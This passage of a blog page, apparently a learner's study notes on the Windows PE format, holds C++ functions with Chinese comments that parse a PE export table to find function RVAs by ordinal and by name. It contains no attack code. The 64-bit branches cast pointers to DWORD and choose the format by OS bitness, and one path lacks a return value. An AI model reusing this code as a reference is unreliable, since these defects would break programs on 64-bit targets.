class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="C-GetFunctionAddrByOrdinals"><a href="#C-GetFunctionAddrByOrdinals" class="headerlink" title="C GetFunctionAddrByOrdinals"></a>C GetFunctionAddrByOrdinals</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*****************************************************************************</span></span><br><span class="line"><span class="comment">根据导出函数序号，得到导出函数RVA</span></span><br><span class="line"><span class="comment">参数：该文件的FileBuffer，导出函数的序号</span></span><br><span class="line"><span class="comment">*****************************************************************************/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> test 0</span></span><br><span class="line"><span class="function">PDWORD <span class="title">GetFunctionAddrByOrdinals</span><span class="params">(PVOID pFileBuffer, DWORD Ordinal)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BOOL Is_64Bit = <span class="built_in">Is_64BitOS</span>(FILEPATH);</span><br><span class="line">	<span class="keyword">if</span>(Is_64Bit)</span><br><span class="line">	&#123;</span><br><span class="line">		PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_NT_HEADERS64 pNTHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_OPTIONAL_HEADER64 pOptionHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_DATA_DIRECTORY pDataDirectory = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_EXPORT_DIRECTORY pExportDirectory = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">		pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;</span><br><span class="line">		pNTHeader = (PIMAGE_NT_HEADERS64)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class="line">		<span class="comment">//pFileHeader = (PIMAGE_FILE_HEADER)((BYTE *)pNTHeader + sizeof(DWORD));</span></span><br><span class="line">		pOptionHeader = (PIMAGE_OPTIONAL_HEADER64)((BYTE *)pNTHeader + IMAGE_SIZEOF_FILE_HEADER + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD)); </span><br><span class="line">		<span class="comment">//pOptionHeader = &amp;pNTHeader-&gt;OptionalHeader;</span></span><br><span class="line">		pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pNTHeader-&gt;FileHeader.SizeOfOptionalHeader);</span><br><span class="line">	</span><br><span class="line">		pDataDirectory = pOptionHeader-&gt;DataDirectory;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;DataDirectory[0].VirtualAddress：&quot;</span> &lt;&lt; hex &lt;&lt; pNTHeader-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">if</span>(pDataDirectory[<span class="number">0</span>].VirtualAddress == <span class="number">0</span>)&#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;不存在导出表...&quot;</span> &lt;&lt; endl;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		DWORD ExportVirtualAddrRVA = pDataDirectory[<span class="number">0</span>].VirtualAddress;</span><br><span class="line">		<span class="comment">//ExportVirtualAddrRVA = 0x1060;</span></span><br><span class="line">		DWORD ExportVirtualAddrFOA = <span class="built_in">RVAToFOA</span>(ExportVirtualAddrRVA, pFileBuffer);</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;ExportVirtualAddrFOA = &quot;</span> &lt;&lt; ExportVirtualAddrFOA &lt;&lt; endl;</span><br><span class="line">	 </span><br><span class="line">		pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(ExportVirtualAddrFOA + (DWORD)pFileBuffer);</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-----------IMAGE_EXPORT_DIRECTORY---------&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;pDataDirectory[0].VirtualAddress  = &quot;</span> &lt;&lt; ExportVirtualAddrRVA       &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;pDataDirectory[0].Size            = &quot;</span> &lt;&lt; pDataDirectory[<span class="number">0</span>].Size                &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Characteristics                   = &quot;</span> &lt;&lt; pExportDirectory-&gt;Characteristics      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;TimeDateStamp                     = &quot;</span> &lt;&lt; pExportDirectory-&gt;TimeDateStamp      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;MajorVersion                      = &quot;</span> &lt;&lt; pExportDirectory-&gt;MajorVersion      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;MinorVersion                      = &quot;</span> &lt;&lt; pExportDirectory-&gt;MinorVersion      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Name                  = &quot;</span> &lt;&lt; pExportDirectory-&gt;Name                   &lt;&lt; endl;</span><br><span class="line">		<span class="comment">//RVAToFOA(pExportDirectory-&gt;Name, pFileBuffer) 将指向Dll文件名的RVAToFOA</span></span><br><span class="line">		<span class="comment">//FOA + (DWORD)pFileBuffer即为Dll文件名的字符串</span></span><br><span class="line">		<span class="built_in">printf</span>(       <span class="string">&quot;Dll文件名             = %s\n&quot;</span>, <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;Name, pFileBuffer) + (DWORD)pFileBuffer);</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Base                  = &quot;</span> &lt;&lt; pExportDirectory-&gt;Base                   &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;NumberOfFunctions     = &quot;</span> &lt;&lt; pExportDirectory-&gt;NumberOfFunctions      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;NumberOfNames         = &quot;</span> &lt;&lt; pExportDirectory-&gt;NumberOfNames          &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfFunctions    = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfFunctions     &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfNames        = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfNames         &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfNameOrdinals = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfNameOrdinals  &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-FunctionsDetail-------------------------------------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-\t\t导出函数序号\t\tRVA\t\tFunctionName&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">		DWORD *AddrFunctions = (DWORD *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfFunctions, pFileBuffer));</span><br><span class="line">		DWORD *AddrName = (DWORD *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfNames, pFileBuffer));</span><br><span class="line">		WORD  *AddrOrdinals = (WORD  *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfNameOrdinals, pFileBuffer));</span><br><span class="line">		DWORD i = Ordinal - pExportDirectory-&gt;Base;</span><br><span class="line">		DWORD j = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; pExportDirectory-&gt;NumberOfNames; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(AddrOrdinals[j] == i)</span><br><span class="line">			&#123; </span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;导出序号 %x 对应的导出函数名为 %s ，该函数RVA为：%x\n&quot;</span>,Ordinal,<span class="built_in">RVAToFOA</span>(AddrName[j], pFileBuffer) + (DWORD)pFileBuffer,AddrFunctions[i]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> (PDWORD)AddrFunctions[i];</span><br><span class="line">	&#125;<span class="comment">//end	if(Is_64Bit)&#123;</span></span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_NT_HEADERS32 pNTHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_OPTIONAL_HEADER32 pOptionHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_DATA_DIRECTORY pDataDirectory = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_EXPORT_DIRECTORY pExportDirectory = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">		pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;</span><br><span class="line">		pNTHeader = (PIMAGE_NT_HEADERS32)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class="line">		<span class="comment">//pFileHeader = (PIMAGE_FILE_HEADER)((BYTE *)pNTHeader + sizeof(DWORD));</span></span><br><span class="line">		pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((BYTE *)pNTHeader + IMAGE_SIZEOF_FILE_HEADER + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD)); </span><br><span class="line">		<span class="comment">//pOptionHeader = &amp;pNTHeader-&gt;OptionalHeader;</span></span><br><span class="line">		pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pNTHeader-&gt;FileHeader.SizeOfOptionalHeader);</span><br><span class="line">	</span><br><span class="line">		pDataDirectory = pOptionHeader-&gt;DataDirectory;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;DataDirectory[0].VirtualAddress：&quot;</span> &lt;&lt; hex &lt;&lt; pNTHeader-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">if</span>(pDataDirectory[<span class="number">0</span>].VirtualAddress == <span class="number">0</span>)&#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;不存在导出表...&quot;</span> &lt;&lt; endl;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		DWORD ExportVirtualAddrRVA = pDataDirectory[<span class="number">0</span>].VirtualAddress;</span><br><span class="line">		<span class="comment">//ExportVirtualAddrRVA = 0x1060;</span></span><br><span class="line">		DWORD ExportVirtualAddrFOA = <span class="built_in">RVAToFOA</span>(ExportVirtualAddrRVA, pFileBuffer);</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;ExportVirtualAddrFOA = &quot;</span> &lt;&lt; ExportVirtualAddrFOA &lt;&lt; endl;</span><br><span class="line">	 </span><br><span class="line">		pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(ExportVirtualAddrFOA + (DWORD)pFileBuffer);</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-----------IMAGE_EXPORT_DIRECTORY---------&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;pDataDirectory[0].VirtualAddress  = &quot;</span> &lt;&lt; ExportVirtualAddrRVA       &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;pDataDirectory[0].Size            = &quot;</span> &lt;&lt; pDataDirectory[<span class="number">0</span>].Size                &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Characteristics                   = &quot;</span> &lt;&lt; pExportDirectory-&gt;Characteristics      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;TimeDateStamp                     = &quot;</span> &lt;&lt; pExportDirectory-&gt;TimeDateStamp      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;MajorVersion                      = &quot;</span> &lt;&lt; pExportDirectory-&gt;MajorVersion      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;MinorVersion                      = &quot;</span> &lt;&lt; pExportDirectory-&gt;MinorVersion      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Name                  = &quot;</span> &lt;&lt; pExportDirectory-&gt;Name                   &lt;&lt; endl;</span><br><span class="line">		<span class="comment">//RVAToFOA(pExportDirectory-&gt;Name, pFileBuffer) 将指向Dll文件名的RVAToFOA</span></span><br><span class="line">		<span class="comment">//FOA + (DWORD)pFileBuffer即为Dll文件名的字符串</span></span><br><span class="line">		<span class="built_in">printf</span>(       <span class="string">&quot;Dll文件名             = %s\n&quot;</span>, <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;Name, pFileBuffer) + (DWORD)pFileBuffer);</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Base                  = &quot;</span> &lt;&lt; pExportDirectory-&gt;Base                   &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;NumberOfFunctions     = &quot;</span> &lt;&lt; pExportDirectory-&gt;NumberOfFunctions      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;NumberOfNames         = &quot;</span> &lt;&lt; pExportDirectory-&gt;NumberOfNames          &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfFunctions    = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfFunctions     &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfNames        = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfNames         &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfNameOrdinals = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfNameOrdinals  &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-FunctionsDetail-------------------------------------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-\t\t导出函数序号\t\tRVA\t\tFunctionName&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">		DWORD *AddrFunctions = (DWORD *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfFunctions, pFileBuffer));</span><br><span class="line">		DWORD *AddrName = (DWORD *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfNames, pFileBuffer));</span><br><span class="line">		WORD  *AddrOrdinals = (WORD  *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfNameOrdinals, pFileBuffer));</span><br><span class="line">		DWORD i = Ordinal - pExportDirectory-&gt;Base;</span><br><span class="line">		DWORD j = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; pExportDirectory-&gt;NumberOfNames; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(AddrOrdinals[j] == i)</span><br><span class="line">			&#123; </span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;导出序号 %x 对应的导出函数名为 %s ，该函数RVA为：%x\n&quot;</span>,Ordinal,<span class="built_in">RVAToFOA</span>(AddrName[j], pFileBuffer) + (DWORD)pFileBuffer,AddrFunctions[i]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> (PDWORD)AddrFunctions[i];</span><br><span class="line">	&#125;<span class="comment">//end else &#123;</span></span><br><span class="line"></span><br><span class="line">&#125;<span class="comment">//end GetFunctionAddrByOrdinals(PVOID pFileBuffer, DWORD Ordinal)</span></span><br></pre></td></tr></table></figure>



<h2 id="D-GetFunctionAddrByName"><a href="#D-GetFunctionAddrByName" class="headerlink" title="D GetFunctionAddrByName"></a>D GetFunctionAddrByName</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*****************************************************************************</span></span><br><span class="line"><span class="comment">根据导出函数名称，得到导出函数RVA</span></span><br><span class="line"><span class="comment">参数：该文件的FileBuffer，导出函数的名称</span></span><br><span class="line"><span class="comment">*****************************************************************************/</span></span><br><span class="line"><span class="function">PDWORD <span class="title">GetFunctionAddrByName</span><span class="params">(PVOID pFileBuffer, LPSTR Fun_Name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BOOL Is_64Bit = <span class="built_in">Is_64BitOS</span>(FILEPATH);</span><br><span class="line">	<span class="keyword">if</span>(Is_64Bit)</span><br><span class="line">	&#123;</span><br><span class="line">		PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_NT_HEADERS64 pNTHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_OPTIONAL_HEADER64 pOptionHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_DATA_DIRECTORY pDataDirectory = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_EXPORT_DIRECTORY pExportDirectory = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">		pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;</span><br><span class="line">		pNTHeader = (PIMAGE_NT_HEADERS64)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class="line">		<span class="comment">//pFileHeader = (PIMAGE_FILE_HEADER)((BYTE *)pNTHeader + sizeof(DWORD));</span></span><br><span class="line">		pOptionHeader = (PIMAGE_OPTIONAL_HEADER64)((BYTE *)pNTHeader + IMAGE_SIZEOF_FILE_HEADER + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD)); </span><br><span class="line">		<span class="comment">//pOptionHeader = &amp;pNTHeader-&gt;OptionalHeader;</span></span><br><span class="line">		pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pNTHeader-&gt;FileHeader.SizeOfOptionalHeader);</span><br><span class="line">	</span><br><span class="line">		pDataDirectory = pOptionHeader-&gt;DataDirectory;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;DataDirectory[0].VirtualAddress：&quot;</span> &lt;&lt; hex &lt;&lt; pNTHeader-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">if</span>(pDataDirectory[<span class="number">0</span>].VirtualAddress == <span class="number">0</span>)&#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;不存在导出表...&quot;</span> &lt;&lt; endl;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		DWORD ExportVirtualAddrRVA = pDataDirectory[<span class="number">0</span>].VirtualAddress;</span><br><span class="line">		<span class="comment">//ExportVirtualAddrRVA = 0x1060;</span></span><br><span class="line">		DWORD ExportVirtualAddrFOA = <span class="built_in">RVAToFOA</span>(ExportVirtualAddrRVA, pFileBuffer);</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;ExportVirtualAddrFOA = &quot;</span> &lt;&lt; ExportVirtualAddrFOA &lt;&lt; endl;</span><br><span class="line">	 </span><br><span class="line">		pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(ExportVirtualAddrFOA + (DWORD)pFileBuffer);</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-----------IMAGE_EXPORT_DIRECTORY---------&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;pDataDirectory[0].VirtualAddress  = &quot;</span> &lt;&lt; ExportVirtualAddrRVA       &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;pDataDirectory[0].Size            = &quot;</span> &lt;&lt; pDataDirectory[<span class="number">0</span>].Size                &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Characteristics                   = &quot;</span> &lt;&lt; pExportDirectory-&gt;Characteristics      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;TimeDateStamp                     = &quot;</span> &lt;&lt; pExportDirectory-&gt;TimeDateStamp      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;MajorVersion                      = &quot;</span> &lt;&lt; pExportDirectory-&gt;MajorVersion      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;MinorVersion                      = &quot;</span> &lt;&lt; pExportDirectory-&gt;MinorVersion      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Name                  = &quot;</span> &lt;&lt; pExportDirectory-&gt;Name                   &lt;&lt; endl;</span><br><span class="line">		<span class="comment">//RVAToFOA(pExportDirectory-&gt;Name, pFileBuffer) 将指向Dll文件名的RVAToFOA</span></span><br><span class="line">		<span class="comment">//FOA + (DWORD)pFileBuffer即为Dll文件名的字符串</span></span><br><span class="line">		<span class="built_in">printf</span>(       <span class="string">&quot;Dll文件名             = %s\n&quot;</span>, <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;Name, pFileBuffer) + (DWORD)pFileBuffer);</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Base                  = &quot;</span> &lt;&lt; pExportDirectory-&gt;Base                   &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;NumberOfFunctions     = &quot;</span> &lt;&lt; pExportDirectory-&gt;NumberOfFunctions      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;NumberOfNames         = &quot;</span> &lt;&lt; pExportDirectory-&gt;NumberOfNames          &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfFunctions    = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfFunctions     &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfNames        = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfNames         &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfNameOrdinals = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfNameOrdinals  &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-FunctionsDetail-------------------------------------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-\t\t导出函数序号\t\tRVA\t\tFunctionName&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">		DWORD *AddrFunctions = (DWORD *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfFunctions, pFileBuffer));</span><br><span class="line">		DWORD *AddrName = (DWORD *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfNames, pFileBuffer));</span><br><span class="line">		WORD  *AddrOrdinals = (WORD  *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfNameOrdinals, pFileBuffer));</span><br><span class="line">		DWORD i = <span class="number">0</span>;</span><br><span class="line">		DWORD j = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		DWORD a = (DWORD)Fun_Name;</span></span><br><span class="line"><span class="comment">		LPSTR* c = &amp;Fun_Name;</span></span><br><span class="line"><span class="comment">		DWORD b = RVAToFOA(AddrName[j], pFileBuffer) + (DWORD)pFileBuffer;</span></span><br><span class="line"><span class="comment">		printf(&quot;Fun_Name地址：%x\n&quot;,Fun_Name);//输出Fun_Name中的值，即字符串的地址</span></span><br><span class="line"><span class="comment">		printf(&quot;Fun_Name地址：%p\n&quot;,Fun_Name);//输出Fun_Name中的值，而非Fun_Name地址，即字符串的地址</span></span><br><span class="line"><span class="comment">		printf(&quot;Fun_Name地址：%p\n&quot;,c);</span></span><br><span class="line"><span class="comment">		printf(&quot;Fun_Name地址：%x\n&quot;,b);</span></span><br><span class="line"><span class="comment">		printf(&quot;Fun_Name地址：%s\n&quot;,b);//将b的整数作为地址去找该地址指向的内容</span></span><br><span class="line"><span class="comment">		printf(&quot;Fun_Name地址：%s\n&quot;,Fun_Name);//输出同上一行</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">		<span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; pExportDirectory-&gt;NumberOfNames; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(!<span class="built_in">strcmp</span>((LPSTR)<span class="built_in">RVAToFOA</span>(AddrName[j], pFileBuffer) + (DWORD)pFileBuffer,Fun_Name))</span><br><span class="line">			&#123; </span><br><span class="line">				i = AddrOrdinals[j];</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;导出序号0x%x 对应的导出函数名为 %s ，该函数RVA为：%x\n&quot;</span>,AddrOrdinals[j] + pExportDirectory-&gt;Base,<span class="built_in">RVAToFOA</span>(AddrName[j], pFileBuffer) + (DWORD)pFileBuffer,AddrFunctions[i]);</span><br><span class="line">				<span class="keyword">return</span> (PDWORD)AddrFunctions[i];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;不存在该导出函数\n&quot;</span>);</span><br><span class="line">	<span class="comment">//return (PDWORD)AddrFunctions[i];</span></span><br><span class="line">	&#125;<span class="comment">//end	if(Is_64Bit)&#123;</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_NT_HEADERS32 pNTHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_OPTIONAL_HEADER32 pOptionHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_DATA_DIRECTORY pDataDirectory = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_EXPORT_DIRECTORY pExportDirectory = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">		pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;</span><br><span class="line">		pNTHeader = (PIMAGE_NT_HEADERS32)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class="line">		<span class="comment">//pFileHeader = (PIMAGE_FILE_HEADER)((BYTE *)pNTHeader + sizeof(DWORD));</span></span><br><span class="line">		pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((BYTE *)pNTHeader + IMAGE_SIZEOF_FILE_HEADER + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD)); </span><br><span class="line">		<span class="comment">//pOptionHeader = &amp;pNTHeader-&gt;OptionalHeader;</span></span><br><span class="line">		pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pNTHeader-&gt;FileHeader.SizeOfOptionalHeader);</span><br><span class="line">	</span><br><span class="line">		pDataDirectory = pOptionHeader-&gt;DataDirectory;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;DataDirectory[0].VirtualAddress：&quot;</span> &lt;&lt; hex &lt;&lt; pNTHeader-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">if</span>(pDataDirectory[<span class="number">0</span>].VirtualAddress == <span class="number">0</span>)&#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;不存在导出表...&quot;</span> &lt;&lt; endl;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		DWORD ExportVirtualAddrRVA = pDataDirectory[<span class="number">0</span>].VirtualAddress;</span><br><span class="line">		<span class="comment">//ExportVirtualAddrRVA = 0x1060;</span></span><br><span class="line">		DWORD ExportVirtualAddrFOA = <span class="built_in">RVAToFOA</span>(ExportVirtualAddrRVA, pFileBuffer);</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;ExportVirtualAddrFOA = &quot;</span> &lt;&lt; ExportVirtualAddrFOA &lt;&lt; endl;</span><br><span class="line">	 </span><br><span class="line">		pExportDirectory = 